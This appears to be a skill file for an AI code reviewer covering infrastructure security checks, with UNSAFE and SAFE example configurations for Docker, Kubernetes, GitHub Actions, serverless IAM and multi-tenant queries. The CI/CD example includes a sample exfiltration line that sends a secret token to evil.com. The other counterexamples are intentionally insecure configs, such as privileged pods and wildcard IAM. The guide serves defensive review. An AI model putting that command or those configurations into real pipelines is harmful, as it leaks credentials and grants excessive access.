---
name: security infrastructure
description: >
  Detect infrastructure security issues in code: Docker misconfigurations, IaC/Kubernetes security
  flaws, CI/CD pipeline vulnerabilities, serverless security gaps, and multi-tenant isolation
  breaches. Trigger when reviewing Dockerfiles, Kubernetes YAML, Terraform/CloudFormation, CI/CD
  configs (.github/workflows, .gitlab-ci.yml), or serverless functions (Lambda, Cloud Functions).
---

# Security Review: Infrastructure & IaC Vulnerabilities

## Purpose
Review infrastructure-as-code and deployment configurations for security issues: Docker container misconfigurations, Kubernetes security policies, CI/CD pipeline vulnerabilities, serverless function security, and multi-tenant isolation flaws.

## Scope
1. **Docker Misconfiguration** — running as root, exposed ports, secrets in layers, base image vulnerabilities
2. **IaC Security** — Kubernetes RBAC gaps, privileged pods, Terraform state secrets, insecure defaults
3. **CI/CD Security** — secrets in logs, supply chain poisoning, insufficient access controls
4. **Serverless Security** — over-permissioned IAM roles, cold start attacks, shared execution environments
5. **Multi-Tenant Isolation** — namespace leaks, shared resources without access control, tenant ID missing in queries

## Detection Strategy

### 1. Docker Misconfiguration Red Flags
- **USER root** or no USER directive (runs as root by default)
- **COPY secrets** into image layers
- **EXPOSE** without network policy restrictions
- **Latest tag** for base images (no version pinning)
- **Secrets in ENV** variables visible in `docker inspect`

**High-risk patterns:**
```dockerfile
# ❌ UNSAFE
FROM node:latest
COPY .env /app/
RUN echo "API_KEY=secret123" > /app/.env
EXPOSE 22
# No USER directive - runs as root
```

### 2. IaC/Kubernetes Security Red Flags
- **privileged: true** in pod security context
- **hostNetwork: true** or **hostPID: true**
- **RBAC rules with** `resources: ["*"]` and `verbs: ["*"]`
- **No PodSecurityPolicy/PodSecurityStandard** enforcement
- **Secrets in plaintext** in YAML (not sealed secrets)
- **No network policies** (default allow all)

**High-risk patterns:**
```yaml
# ❌ UNSAFE
apiVersion: v1
kind: Pod
spec:
  containers:
  - name: app
    securityContext:
      privileged: true
      runAsUser: 0
  hostNetwork: true
```

### 3. CI/CD Security Red Flags
- **Secrets echoed in logs** (`echo $SECRET`, `env`)
- **Untrusted code execution** in pull requests (forks running in main context)
- **Self-hosted runners** without isolation
- **No dependency scanning** (Dependabot, Snyk)
- **Artifacts without signing** (no SLSA/in-toto)

**High-risk patterns:**
```yaml
# ❌ UNSAFE (.github/workflows)
on: [pull_request_target]  # Runs fork code in main context
steps:
  - run: echo "Secret: ${{ secrets.API_KEY }}"  # Logged
  - run: |
      curl https://evil.com?token=$SECRET  # Exfiltration
```

### 4. Serverless Security Red Flags
- **Lambda/Cloud Function with** `Action: "*"` IAM policy
- **No VPC** for functions accessing databases
- **Environment variables with secrets** (use Secrets Manager)
- **Public invocation URL** without authentication
- **No resource limits** (cost/DoS risk)

**High-risk patterns:**
```yaml
# ❌ UNSAFE (serverless.yml)
functions:
  api:
    handler: handler.main
    events:
      - http:
          path: /
          method: ANY
          cors: true
    iamRoleStatements:
      - Effect: Allow
        Action: "*"
        Resource: "*"
```

### 5. Multi-Tenant Isolation Red Flags
- **Shared database without tenant_id in queries**
- **Cross-tenant data access** via predictable IDs
- **Namespace leaks** in Kubernetes (pods accessing other namespaces)
- **Shared cache keys** without tenant prefix
- **No tenant validation** in middleware

**High-risk patterns:**
```python
# ❌ UNSAFE: No tenant filtering
def get_user(user_id):
    return db.query("SELECT * FROM users WHERE id = ?", (user_id,))
```

## Platform-Specific Guidance

### Docker/Containers
- **Primary risks:** Root execution, secrets in layers, vulnerable base images
- **Key review areas:** Dockerfile USER directive, COPY commands, base image tags
- **OWASP references:** Docker_Security, NodeJS_Docker

### Kubernetes
- **Primary risks:** Privileged pods, RBAC wildcards, no network policies
- **Key review areas:** securityContext, RBAC rules, NetworkPolicy definitions
- **OWASP references:** Kubernetes_Security

### CI/CD (GitHub Actions, GitLab CI, etc.)
- **Primary risks:** Secret leakage, pull_request_target abuse, artifact poisoning
- **Key review areas:** Workflow triggers, secret usage, external action versions
- **OWASP references:** CI_CD_Security

### Serverless (AWS Lambda, Cloud Functions, etc.)
- **Primary risks:** Over-permissioned IAM, public endpoints, cold start attacks
- **Key review areas:** IAM policies, trigger configurations, VPC settings
- **OWASP references:** Serverless_FaaS_Security

### Multi-Tenant SaaS
- **Primary risks:** Tenant ID missing in queries, cross-tenant access, namespace leaks
- **Key review areas:** Database queries, API authorization, cache keys
- **OWASP references:** Multi_Tenant_Security

## Review Instructions

### Step 1: Audit Dockerfiles
```bash
# Check for root user
rg "^USER " Dockerfile || echo "WARNING: No USER directive found"

# Check for secrets
rg "COPY.*\.env|RUN.*echo.*API_KEY|ENV.*SECRET" Dockerfile

# Check base image
rg "FROM.*:latest" Dockerfile
```

**Safe Dockerfile pattern:**
```dockerfile
# ✅ SAFE
FROM node:18.20.0-alpine  # Pinned version
WORKDIR /app
COPY package*.json ./
RUN npm ci --only=production
COPY --chown=node:node . .
USER node  # Non-root
EXPOSE 3000
CMD ["node", "server.js"]
```

### Step 2: Audit Kubernetes YAML
```bash
# Check privileged pods
rg "privileged:\s*true" k8s/

# Check host access
rg "hostNetwork:\s*true|hostPID:\s*true" k8s/

# Check RBAC wildcards
rg "resources:\s*\[\s*\"\*\"" k8s/
```

**Safe pod security:**
```yaml
# ✅ SAFE
apiVersion: v1
kind: Pod
spec:
  securityContext:
    runAsNonRoot: true
    runAsUser: 1000
    fsGroup: 1000
  containers:
  - name: app
    securityContext:
      allowPrivilegeEscalation: false
      readOnlyRootFilesystem: true
      capabilities:
        drop: ["ALL"]
```

### Step 3: Audit CI/CD Workflows
```yaml
# ✅ SAFE (.github/workflows)
on:
  pull_request:  # Not pull_request_target
    branches: [main]

jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4  # Pinned version
      
      - name: Use secret
        env:
          API_KEY: ${{ secrets.API_KEY }}
        run: |
          # Secret NOT echoed
          curl -H "Authorization: Bearer $API_KEY" https://api.example.com
```

### Step 4: Audit Serverless Configurations
```yaml
# ✅ SAFE (AWS SAM)
Resources:
  ApiFunction:
    Type: AWS::Serverless::Function
    Properties:
      Handler: index.handler
      Runtime: nodejs18.x
      Environment:
        Variables:
          SECRET_ARN: !Ref MySecret  # Reference, not value
      Policies:
        - DynamoDBCrudPolicy:
            TableName: !Ref MyTable  # Least privilege
      VpcConfig:
        SubnetIds:
          - !Ref PrivateSubnet1
```

### Step 5: Validate Multi-Tenant Isolation
```python
# ✅ SAFE: Tenant filtering
def get_user(user_id, tenant_id):
    return db.query(
        "SELECT * FROM users WHERE id = ? AND tenant_id = ?",
        (user_id, tenant_id)
    )

# Middleware enforces tenant_id
@app.before_request
def enforce_tenant():
    if 'tenant_id' not in g:
        abort(403)
```

## Examples

### ✅ SAFE: Non-Root Docker Container
```dockerfile
FROM python:3.11-slim
RUN useradd -m -u 1000 appuser
WORKDIR /app
COPY --chown=appuser:appuser . .
USER appuser
CMD ["python", "app.py"]
```

### ❌ UNSAFE: Root Container with Secrets
```dockerfile
FROM python:latest
COPY .env /app/
RUN cat /app/.env
CMD ["python", "app.py"]
```
**Finding:** Critical — Container runs as root + secrets copied into image layer + base image not pinned.

### ✅ SAFE: Least-Privilege Lambda
```yaml
Resources:
  MyFunction:
    Type: AWS::Lambda::Function
    Properties:
      Role: !GetAtt FunctionRole.Arn
  FunctionRole:
    Type: AWS::IAM::Role
    Properties:
      ManagedPolicyArns:
        - arn:aws:iam::aws:policy/service-role/AWSLambdaVPCAccessExecutionRole
      Policies:
        - PolicyName: DynamoDBAccess
          PolicyDocument:
            Statement:
              - Effect: Allow
                Action:
                  - dynamodb:GetItem
                  - dynamodb:Query
                Resource: !GetAtt MyTable.Arn
```

### ❌ UNSAFE: Over-Permissioned Lambda
```yaml
iamRoleStatements:
  - Effect: Allow
    Action: "*"
    Resource: "*"
```
**Finding:** Critical — Lambda has full AWS account permissions. Apply least privilege.

## Migration Coverage
Review guidance from the legacy review-task corpus is now consolidated in this skill and validated via the migration inventory (`openspec/changes/research-changes/artifacts/review-task-skill-map.csv`).

## OWASP References
- [Docker Security](https://cheatsheetseries.owasp.org/cheatsheets/Docker_Security_Cheat_Sheet.html)
- [Kubernetes Security](https://cheatsheetseries.owasp.org/cheatsheets/Kubernetes_Security_Cheat_Sheet.html)
- [CI/CD Security](https://cheatsheetseries.owasp.org/cheatsheets/CI_CD_Security_Cheat_Sheet.html)
- [Serverless Security](https://cheatsheetseries.owasp.org/cheatsheets/Serverless_FaaS_Security_Cheat_Sheet.html)
- [Multi-Tenant Security](https://cheatsheetseries.owasp.org/cheatsheets/Multi_Tenant_Security_Cheat_Sheet.html)

## Quick Checklist
- [ ] Dockerfile USER directive set (non-root)
- [ ] No secrets in Docker layers (use build args + secrets mounting)
- [ ] Base images pinned to specific versions
- [ ] Kubernetes pods run as non-root with dropped capabilities
- [ ] RBAC rules follow least privilege (no wildcards)
- [ ] CI/CD secrets not echoed in logs
- [ ] Serverless functions have least-privilege IAM policies
- [ ] Multi-tenant queries include tenant_id filtering
- [ ] Network policies defined (Kubernetes)
- [ ] Dependency scanning enabled in CI/CD
